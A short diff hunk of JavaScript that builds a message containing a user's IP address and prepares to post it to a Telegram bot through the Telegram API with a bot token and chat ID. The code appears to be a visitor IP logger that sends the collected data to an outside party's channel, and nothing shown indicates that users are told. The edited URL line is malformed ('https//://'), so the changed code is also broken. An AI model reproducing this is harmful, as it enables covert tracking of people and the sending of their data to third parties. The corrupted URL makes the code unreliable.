@@ -94,8 +94,8 @@
         return;
       }
 
-      const message = User's IP Address: ${userIP};
-      const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+      const message = `User's IP Address: ${userIP}`;
+      const url = https//://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
       const params = new URLSearchParams();
       params.append("chat_id", chatID);
       params.append("text", message);
